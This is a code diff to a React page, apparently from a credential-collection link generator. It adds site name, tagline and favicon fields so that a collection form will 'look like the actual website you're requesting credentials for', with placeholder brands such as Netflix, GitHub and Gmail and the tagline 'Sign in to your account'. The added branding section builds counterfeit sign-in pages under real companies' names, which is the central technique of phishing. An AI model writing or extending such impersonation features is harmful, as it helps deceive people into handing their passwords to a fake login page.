@@ -21,6 +21,9 @@ export default function AskForInfoPage() {
   const [generatedLink, setGeneratedLink] = useState<string | null>(null)
   const [copied, setCopied] = useState(false)
   const [websiteUrl, setWebsiteUrl] = useState('')
+  const [siteName, setSiteName] = useState('')
+  const [siteTagline, setSiteTagline] = useState('')
+  const [customFaviconUrl, setCustomFaviconUrl] = useState('')
   const [formBackground, setFormBackground] = useState('#ffffff')
   const [pageBackground, setPageBackground] = useState('#f3f4f6')
   const [buttonBackground, setButtonBackground] = useState('#ec4899')
@@ -88,6 +91,9 @@ export default function AskForInfoPage() {
           requires_auth: requiresAuth,
           website_url: itemType === 'credential' ? websiteUrl : null,
           logo_url: logoUrl,
+          site_name: siteName || null,
+          site_tagline: siteTagline || null,
+          custom_favicon_url: customFaviconUrl || null,
           form_background_color: formBackground,
           page_background_color: pageBackground,
           button_background_color: buttonBackground,
@@ -215,21 +221,74 @@ export default function AskForInfoPage() {
           />
 
           {itemType === 'credential' && (
-            <div>
-              <label className="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-2 flex items-center gap-2">
-                <LinkIcon size={16} className="text-pink-500" />
-                Website URL (for logo)
-              </label>
-              <input
-                type="url"
-                value={websiteUrl}
-                onChange={(e) => setWebsiteUrl(e.target.value)}
-                placeholder="https://example.com"
-                className="w-full px-5 py-3 bg-gray-50 dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
-              />
-              <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
-                The logo from this URL will be displayed on the collection form
+            <div className="space-y-4 p-4 bg-gradient-to-br from-purple-50 to-pink-50 dark:from-slate-800 dark:to-slate-800 rounded-xl border border-purple-200 dark:border-slate-700">
+              <div className="flex items-center gap-2 mb-2">
+                <Sparkles size={18} className="text-purple-600 dark:text-purple-400" />
+                <h3 className="text-sm font-bold text-gray-900 dark:text-white">Site Branding (Optional)</h3>
+              </div>
+              <p className="text-xs text-gray-600 dark:text-gray-400 mb-3">
+                Make your collection link look like the actual website you're requesting credentials for
               </p>
+              
+              <div>
+                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2">
+                  Site Name
+                </label>
+                <input
+                  type="text"
+                  value={siteName}
+                  onChange={(e) => setSiteName(e.target.value)}
+                  placeholder="e.g., Netflix, GitHub, Gmail"
+                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
+                />
+              </div>
+
+              <div>
+                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2">
+                  Site Tagline
+                </label>
+                <input
+                  type="text"
+                  value={siteTagline}
+                  onChange={(e) => setSiteTagline(e.target.value)}
+                  placeholder="e.g., Sign in to your account"
+                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
+                />
+              </div>
+
+              <div>
+                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2 flex items-center gap-2">
+                  <LinkIcon size={14} className="text-pink-500" />
+                  Website URL (for automatic logo)
+                </label>
+                <input
+                  type="url"
+                  value={websiteUrl}
+                  onChange={(e) => setWebsiteUrl(e.target.value)}
+                  placeholder="https://example.com"
+                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
+                />
+                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
+                  Logo will be fetched automatically from this URL
+                </p>
+              </div>
+
+              <div>
+                <label className="block text-xs font-medium text-gray-700 dark:text-gray-300 mb-2 flex items-center gap-2">
+                  <ImageIcon size={14} className="text-pink-500" />
+                  Custom Favicon URL (Optional)
+                </label>
+                <input
+                  type="url"
+                  value={customFaviconUrl}
+                  onChange={(e) => setCustomFaviconUrl(e.target.value)}
+                  placeholder="https://example.com/favicon.ico"
+                  className="w-full px-4 py-3 bg-white dark:bg-slate-700 border border-gray-300 dark:border-slate-600 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all text-gray-900 dark:text-white"
+                />
+                <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
+                  Override auto-fetched logo with a custom favicon URL
+                </p>
+              </div>
             </div>
           )}
 
